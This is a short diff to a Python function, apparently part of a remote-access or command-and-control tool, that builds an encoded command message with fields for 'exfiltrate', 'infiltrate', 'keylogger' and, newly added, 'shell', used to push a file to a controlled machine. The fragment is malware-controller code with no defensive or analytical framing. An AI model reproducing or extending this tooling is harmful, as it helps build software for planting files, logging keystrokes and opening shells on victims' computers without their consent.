@@ -80,7 +80,7 @@ def uploadfile( id, file_path, file_name ):
 			seconds_from_epoch = int(time.time())
 			empty_command_output = "e30="
 			default_group_id = 1
-			formatted_command = "{\"commands\": {}, \"exfiltrate\":{}, \"infiltrate\": {\"" + str(seconds_from_epoch) + "\": \"" + file_name + "\"}, \"keylogger\": 0}"
+			formatted_command = "{\"commands\": {}, \"exfiltrate\":{}, \"infiltrate\": {\"" + str(seconds_from_epoch) + "\": \"" + file_name + "\"}, \"keylogger\": 0, \"shell\": 0}"
 			formatted_encoded = encode(formatted_command)
 			custom_filename = "{\"" + str(seconds_from_epoch) + "\": \"" + file_path + "\"}"
 			encoded_custom_filename = encode(custom_filename)
